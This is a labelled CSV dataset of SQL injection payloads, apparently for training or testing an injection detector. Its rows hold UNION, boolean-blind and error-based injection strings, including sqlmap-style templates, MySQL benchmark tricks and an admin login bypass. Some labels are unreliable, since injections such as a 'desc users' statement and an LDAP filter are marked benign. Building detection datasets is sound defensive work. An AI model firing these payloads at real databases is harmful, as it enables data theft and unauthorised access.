id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18116,AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),union_based,generic,0.7,UNION-based payload detected. Payload length: 241 chars.,2
18117,OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)) OR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END)),union_based,generic,0.7,UNION-based payload detected. Payload length: 239 chars.,2
18121,"OR EXTRACTVALUE([RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 0x3A END) OR EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)",error_based,mysql,0.7,Error-based SQLi (extractvalue/updatexml); DB: mysql,2
18143,"1 UNION SELECT 1,2,3--",union_based,generic,0.7,UNION-based payload detected. Payload length: 22 chars.,2
18157,"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
18161,"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
18163,"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
18182,"-7868"" ) ) or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
18184,-7999 ) or 8422 = 1336,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
18126,([RANDNUM]=[RANDNUM])*[RANDNUM1] ([INFERENCE])*[RANDNUM],benign,generic,0.5,. Payload length: 56 chars.,2
18127,([RANDNUM]=[RANDNUM])*[ORIGVALUE] ([INFERENCE])*[ORIGVALUE],benign,generic,0.5,. Payload length: 59 chars.,2
18148,truncate,benign,generic,0.5,. Payload length: 8 chars.,2
18152,exec sp,benign,generic,0.5,. Payload length: 7 chars.,2
18154,procedure,benign,generic,0.5,. Payload length: 9 chars.,2
18155,\'; desc users; --,benign,generic,0.5,. Payload length: 18 chars.,2
18159,sqlvuln;,benign,generic,0.5,. Payload length: 8 chars.,2
18164,@variable,benign,generic,0.5,. Payload length: 9 chars.,2
18167,replace,benign,generic,0.5,. Payload length: 7 chars.,2
18168,* ( | ( objectclass = * ) ),benign,generic,0.5,. Payload length: 27 chars.,2
18169,limit,benign,generic,0.5,. Payload length: 5 chars.,2
18178,( 1589 = 1589 ) *1,benign,generic,0.5,. Payload length: 18 chars.,2
18177,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
18189,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
18193,"1 ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 1748 = 1748",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
18113,AND [RANDNUM]=[RANDNUM] AND [INFERENCE],boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,1
18114,OR [RANDNUM]=[RANDNUM] OR [INFERENCE],boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,1
18115,OR NOT [RANDNUM]=[RANDNUM] OR NOT [INFERENCE],boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,1
18119,"AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) AND MAKE_SET([INFERENCE],[RANDNUM])",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 80 chars.,1
18120,"OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1]) OR MAKE_SET([INFERENCE],[RANDNUM])",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 78 chars.,1
18124,AND CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END AND CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 143 chars.,1
18125,OR CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END OR CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE JSON('[RANDSTR]') END,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 141 chars.,1
18147,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,1
18187,"end and ( ( ""rqay"" like ""rqay",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,1
18194,"end and ( ""qkkn"" like ""qkkn",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,1
18170,# from wapiti,benign,generic,0.5,. Payload length: 13 chars.,1
